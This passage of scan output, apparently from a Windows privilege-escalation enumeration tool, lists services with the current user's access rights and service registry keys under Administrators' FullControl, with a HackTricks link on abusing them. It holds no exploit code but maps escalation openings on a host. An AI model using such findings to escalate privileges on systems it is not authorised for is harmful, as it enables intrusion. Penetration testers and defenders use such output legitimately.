    CoreMessagingRegistrar: Start, GenericExecute (Start/Stop)
    CryptSvc: AllAccess
    CscService: AllAccess
    DcomLaunch: WriteDac
    defragsvc: AllAccess
    DeviceAssociationService: AllAccess
    DeviceInstall: AllAccess
    DevQueryBroker: AllAccess
    Dhcp: Start, AllAccess
    diagnosticshub.standardcollector.service: AllAccess
    diagsvc: AllAccess
    DiagTrack: AllAccess
    DialogBlockingService: AllAccess
    DispBrokerDesktopSvc: AllAccess
    DisplayEnhancementService: Start, AllAccess
    DmEnrollmentSvc: AllAccess
    dmwappushservice: Start, AllAccess
    DoSvc: Start, AllAccess
    dot3svc: AllAccess
    DPS: ChangeConfig
    DsmSvc: AllAccess, Start
    DsSvc: Start, AllAccess
    DusmSvc: AllAccess
    Eaphost: AllAccess
    edgeupdate: AllAccess
    edgeupdatem: AllAccess
    EFS: Start, ChangeConfig
    embeddedmode: Start, GenericExecute (Start/Stop)
    EntAppSvc: Start, GenericExecute (Start/Stop)
    EventLog: AllAccess
    EventSystem: AllAccess
    Fax: Start, AllAccess
    fdPHost: AllAccess
    FDResPub: AllAccess
    fhsvc: Start, AllAccess
    FontCache: Start, AllAccess
    FrameServer: AllAccess
    GraphicsPerfSvc: AllAccess
    hidserv: AllAccess
    HvHost: AllAccess
    icssvc: Start, AllAccess
    IKEEXT: AllAccess
    InstallService: AllAccess
    iphlpsvc: AllAccess
    IpxlatCfgSvc: Start, AllAccess
    Jenkins: AllAccess
    KeyIso: Start, AllAccess
    KtmRm: Start, AllAccess
    LanmanServer: AllAccess
    LanmanWorkstation: AllAccess
    lfsvc: AllAccess
    LicenseManager: AllAccess
    lltdsvc: AllAccess
    lmhosts: AllAccess
    LxpSvc: AllAccess
    MapsBroker: Start, AllAccess
    MicrosoftEdgeElevationService: AllAccess
    MixedRealityOpenXRSvc: AllAccess
    mpssvc: WriteDac
    MSDTC: Start, ChangeConfig
    MSiSCSI: AllAccess
    msiserver: Start, GenericExecute (Start/Stop)
    MsKeyboardFilter: AllAccess
    NaturalAuthentication: AllAccess
    NcaSvc: AllAccess
    NcbService: AllAccess
    NcdAutoSetup: AllAccess
    Netlogon: AllAccess
    Netman: AllAccess
    netprofm: AllAccess
    NetSetupSvc: AllAccess, Start
    NetTcpPortSharing: Start, AllAccess
    NgcCtnrSvc: WriteDac
    NgcSvc: WriteDac
    NlaSvc: AllAccess
    nsi: AllAccess
    p2pimsvc: AllAccess, Start
    p2psvc: AllAccess, Start
    PcaSvc: AllAccess
    PeerDistSvc: Start, AllAccess
    perceptionsimulation: AllAccess
    PerfHost: AllAccess
    PhoneSvc: Start, AllAccess
    pla: Start, AllAccess
    PlugPlay: AllAccess
    PNRPAutoReg: AllAccess
    PNRPsvc: AllAccess, Start
    PolicyAgent: AllAccess
    Power: AllAccess
    PrintNotify: AllAccess
    ProfSvc: AllAccess
    PushToInstall: AllAccess
    QWAVE: AllAccess
    RasAuto: AllAccess
    RasMan: Start, AllAccess
    RemoteAccess: AllAccess
    RemoteRegistry: AllAccess
    RetailDemo: AllAccess
    RmSvc: ChangeConfig, GenericExecute (Start/Stop)
    RpcEptMapper: WriteDac, Start
    RpcLocator: AllAccess
    RpcSs: WriteDac
    SamSs: AllAccess
    SCardSvr: ChangeConfig
    ScDeviceEnum: ChangeConfig
    Schedule: WriteDac
    SCPolicySvc: ChangeConfig
    SDRSVC: AllAccess
    seclogon: Start, AllAccess
    SEMgrSvc: AllAccess
    SENS: AllAccess
    Sense: Start, ChangeConfig
    SensorDataService: AllAccess
    SensorService: Start, AllAccess
    SensrSvc: Start, AllAccess
    SessionEnv: AllAccess
    SgrmBroker: AllAccess
    SharedAccess: Start, AllAccess
    SharedRealitySvc: AllAccess
    ShellHWDetection: AllAccess
    shpamsvc: AllAccess
    smphost: Start, AllAccess
    SmsRouter: ChangeConfig, Start
    SNMPTRAP: AllAccess
    spectrum: AllAccess
    Spooler: AllAccess
    sppsvc: Start, WriteDac
    SSDPSRV: AllAccess
    ssh-agent: Start, AllAccess
    SstpSvc: Start, AllAccess
    StateRepository: Start, GenericExecute (Start/Stop)
    stisvc: AllAccess
    StorSvc: AllAccess
    svsvc: AllAccess
    swprv: AllAccess
    SysMain: AllAccess
    SystemEventsBroker: WriteDac, Start
    TabletInputService: Start, AllAccess
    TapiSrv: Start, AllAccess
    TermService: AllAccess
    Themes: AllAccess
    TieringEngineService: AllAccess
    TimeBrokerSvc: WriteDac, Start
    TokenBroker: AllAccess
    TrkWks: AllAccess
    TroubleshootingSvc: AllAccess
    TrustedInstaller: ChangeConfig
    tzautoupdate: AllAccess
    UevAgentService: Start, AllAccess
    UmRdpService: AllAccess
    upnphost: AllAccess
    UserManager: AllAccess
    UsoSvc: Start, AllAccess
    VacSvc: AllAccess
    VaultSvc: Start, AllAccess
    vds: AllAccess
    VGAuthService: AllAccess
    vmicguestinterface: AllAccess
    vmicheartbeat: AllAccess
    vmickvpexchange: AllAccess
    vmicrdv: AllAccess
    vmicshutdown: AllAccess
    vmictimesync: AllAccess
    vmicvmsession: AllAccess
    vmicvss: AllAccess
    VMTools: AllAccess
    vmvss: AllAccess
    VMwareCAFCommAmqpListener: AllAccess
    VMwareCAFManagementAgentHost: AllAccess
    VSS: AllAccess
    W32Time: AllAccess
    WaaSMedicSvc: Start, AllAccess
    WalletService: AllAccess
    WarpJITSvc: AllAccess
    wbengine: AllAccess
    WbioSrvc: AllAccess
    Wcmsvc: AllAccess
    wcncsvc: AllAccess
    WdiServiceHost: ChangeConfig
    WdiSystemHost: ChangeConfig
    WdNisSvc: AllAccess
    WebClient: AllAccess
    Wecsvc: AllAccess
    WEPHOSTSVC: AllAccess
    wercplsupport: AllAccess
    WerSvc: AllAccess
    WFDSConMgrSvc: AllAccess
    WiaRpc: AllAccess
    WinDefend: Start, ChangeConfig
    Winmgmt: AllAccess
    WinRM: AllAccess
    WiseBootAssistant: AllAccess
    wisvc: AllAccess
    WlanSvc: AllAccess
    wlidsvc: AllAccess
    wlpasvc: AllAccess
    WManSvc: AllAccess
    wmiApSrv: AllAccess
    WMPNetworkSvc: AllAccess
    workfolderssvc: AllAccess
    WpcMonSvc: AllAccess
    WPDBusEnum: AllAccess
    WpnService: AllAccess
    WSearch: AllAccess
    wuauserv: Start, AllAccess
    WwanSvc: AllAccess
    XblAuthManager: AllAccess
    XblGameSave: AllAccess
    XboxGipSvc: AllAccess
    XboxNetApiSvc: AllAccess
    AarSvc_4169d: AllAccess
    BcastDVRUserService_4169d: GenericExecute (Start/Stop), AllAccess
    BluetoothUserService_4169d: AllAccess
    CaptureService_4169d: AllAccess
    cbdhsvc_4169d: AllAccess
    CDPUserSvc_4169d: AllAccess
    ConsentUxUserSvc_4169d: GenericExecute (Start/Stop), AllAccess
    CredentialEnrollmentManagerUserSvc_4169d: GenericExecute (Start/Stop)
    DeviceAssociationBrokerSvc_4169d: GenericExecute (Start/Stop)
    DevicePickerUserSvc_4169d: GenericExecute (Start/Stop), AllAccess
    DevicesFlowUserSvc_4169d: GenericExecute (Start/Stop), AllAccess
    MessagingService_4169d: AllAccess
    OneSyncSvc_4169d: Start, AllAccess
    PimIndexMaintenanceSvc_4169d: GenericExecute (Start/Stop), AllAccess
    PrintWorkflowUserSvc_4169d: GenericExecute (Start/Stop)
    UdkUserSvc_4169d: GenericExecute (Start/Stop), AllAccess
    UnistoreSvc_4169d: GenericExecute (Start/Stop), AllAccess
    UserDataSvc_4169d: GenericExecute (Start/Stop), AllAccess
    WpnUserService_4169d: GenericExecute (Start/Stop), AllAccess

����������͹ Looking if you can modify any service registry
� Check if you can modify the registry of a service https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#services-registry-permissions
    HKLM\system\currentcontrolset\services\.NET CLR Data (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\.NET CLR Networking (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\.NET CLR Networking 4.0.0.0 (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\.NET Data Provider for Oracle (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\.NET Data Provider for SqlServer (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\.NET Memory Cache 4.0 (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\.NETFramework (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\1394ohci (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\3ware (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\AarSvc (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\AarSvc_4169d (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\ACPI (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\AcpiDev (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\acpiex (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\acpipagr (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\AcpiPmi (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\acpitime (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\Acx01000 (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\ADOVMPPackage (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\ADP80XX (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\adsi (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\AFD (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\afunix (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\ahcache (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\AJRouter (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\ALG (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\amdgpio2 (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\amdi2c (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\AmdK8 (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\AmdPPM (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\amdsata (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\amdsbs (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\amdxata (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\AppID (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\AppIDSvc (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\Appinfo (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\applockerfltr (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\AppMgmt (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\AppReadiness (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\AppVClient (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\AppvStrm (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\AppvVemgr (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\AppvVfs (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\AppXSvc (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\arcsas (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\AssignedAccessManagerSvc (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\AsyncMac (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\atapi (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\AudioEndpointBuilder (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\Audiosrv (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\autotimesvc (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\AxInstSV (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\b06bdrv (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\bam (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\BasicDisplay (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\BasicRender (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\BattC (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\BcastDVRUserService (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\BcastDVRUserService_4169d (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\bcmfn2 (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\BDESVC (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\Beep (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\BFE (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\bindflt (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\BITS (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\BluetoothUserService (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\BluetoothUserService_4169d (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\bowser (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\BrokerInfrastructure (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\BTAGService (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\BthA2dp (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\BthAvctpSvc (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\BthEnum (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\BthHFEnum (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\BthLEEnum (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\BthMini (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\BTHMODEM (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\BTHPORT (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\bthserv (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\BTHUSB (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\bttflt (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\buttonconverter (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\CAD (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\camsvc (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\CaptureService (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\CaptureService_4169d (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\cbdhsvc (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\cbdhsvc_4169d (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\cdfs (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\CDPSvc (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\CDPUserSvc (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\CDPUserSvc_4169d (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\cdrom (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\CertPropSvc (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\cht4iscsi (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\cht4vbd (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\CimFS (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\circlass (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\CldFlt (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\CLFS (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\ClipSVC (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\clr_optimization_v4.0.30319_32 (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\clr_optimization_v4.0.30319_64 (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\CmBatt (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\CNG (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\cnghwassist (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\CompositeBus (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\COMSysApp (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\condrv (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\ConsentUxUserSvc (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\ConsentUxUserSvc_4169d (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\CoreMessagingRegistrar (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\CoreUI (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\CredentialEnrollmentManagerUserSvc (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\CredentialEnrollmentManagerUserSvc_4169d (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\crypt32 (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\CryptSvc (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\CSC (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\CscService (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\dam (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\DCLocator (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\defragsvc (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\DeviceAssociationBrokerSvc (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\DeviceAssociationBrokerSvc_4169d (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\DeviceAssociationService (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\DeviceInstall (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\DevicePickerUserSvc (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\DevicePickerUserSvc_4169d (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\DevicesFlowUserSvc (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\DevicesFlowUserSvc_4169d (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\DevQueryBroker (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\Dfsc (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\Dhcp (Administrators [FullControl GenericAll])
    HKLM\system\currentcontrolset\services\diagnosticshub.standardcollector.service (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\diagsvc (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\DiagTrack (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\DialogBlockingService (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\disk (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\DispBrokerDesktopSvc (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\DisplayEnhancementService (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\DmEnrollmentSvc (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\dmvsc (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\dmwappushservice (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\Dnscache (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\DoSvc (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\dot3svc (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\drmkaud (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\DsmSvc (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\DsSvc (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\DusmSvc (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\DXGKrnl (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\E1G60 (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\e1i65x64 (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\Eaphost (Administrators [WriteKey FullControl])
    HKLM\system\currentcontrolset\services\ebdrv (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\edgeupdate (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\edgeupdatem (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\EFS (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\EhStorClass (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\EhStorTcgDrv (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\embeddedmode (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\EntAppSvc (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\ErrDev (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\ESENT (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\EventLog (Administrators [FullControl GenericAll])
    HKLM\system\currentcontrolset\services\EventSystem (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\exfat (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\fastfat (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\Fax (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\fdc (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\fdPHost (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\FDResPub (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\fhsvc (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\FileCrypt (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\FileInfo (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\Filetrace (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\flpydisk (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\FltMgr (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\FontCache (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\FrameServer (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\FsDepends (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\Fs_Rec (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\fvevol (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\gencounter (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\genericusbfn (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\GPIOClx0101 (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\GpuEnergyDrv (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\GraphicsPerfSvc (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\HdAudAddService (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\HDAudBus (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\HidBatt (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\HidBth (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\hidi2c (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\hidinterrupt (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\HidIr (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\hidserv (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\hidspi (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\HidUsb (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\HomeGroupListener (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\HomeGroupProvider (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\HpSAMD (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\HTTP (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\hvcrash (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\HvHost (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\hvservice (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\HwNClx0101 (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\hwpolicy (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\hyperkbd (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\HyperVideo (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\i8042prt (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\iagpio (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\iai2c (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\iaLPSS2i_GPIO2 (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\iaLPSS2i_GPIO2_BXT_P (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\iaLPSS2i_GPIO2_CNL (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\iaLPSS2i_GPIO2_GLK (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\iaLPSS2i_I2C (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\iaLPSS2i_I2C_BXT_P (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\iaLPSS2i_I2C_CNL (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\iaLPSS2i_I2C_GLK (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\iaLPSSi_GPIO (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\iaLPSSi_I2C (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\iaStorAV (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\iaStorAVC (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\iaStorV (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\ibbus (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\icssvc (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\IKEEXT (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\IndirectKmd (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\inetaccs (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\InstallService (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\intelide (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\intelpep (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\intelpmax (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\intelppm (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\iorate (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\IpFilterDriver (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\iphlpsvc (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\IPMIDRV (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\IPNAT (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\IPT (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\IpxlatCfgSvc (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\isapnp (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\iScsiPrt (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\ItSas35i (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\Jenkins (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\kbdclass (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\kbdhid (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\kbldfltr (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\kdnic (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\KeyIso (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\KSecDD (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\KSecPkg (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\ksthunk (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\KtmRm (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\LanmanServer (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\LanmanWorkstation (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\ldap (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\lfsvc (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\LicenseManager (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\lltdio (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\lltdsvc (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\lmhosts (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\Lsa (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\LSI_SAS (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\LSI_SAS2i (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\LSI_SAS3i (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\LSI_SSS (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\LSM (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\luafv (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\LxpSvc (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\MapsBroker (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\mausbhost (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\mausbip (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\MbbCx (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\megasas (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\megasas2i (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\megasas35i (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\megasr (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\MessagingService (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\MessagingService_4169d (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\MicrosoftEdgeElevationService (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\Microsoft_Bluetooth_AvrcpTransport (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\MixedRealityOpenXRSvc (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\mlx4_bus (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\MMCSS (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\Modem (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\monitor (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\mouclass (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\mouhid (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\mountmgr (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\mpsdrv (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\mpssvc (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\MRxDAV (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\mrxsmb (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\mrxsmb20 (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\MsBridge (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\MSDTC (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\MSDTC Bridge 4.0.0.0 (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\Msfs (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\msgpiowin32 (Administrators [FullControl])
    HKLM\system\currentcontrolset\services\mshidkmdf (Administrators [FullControl])
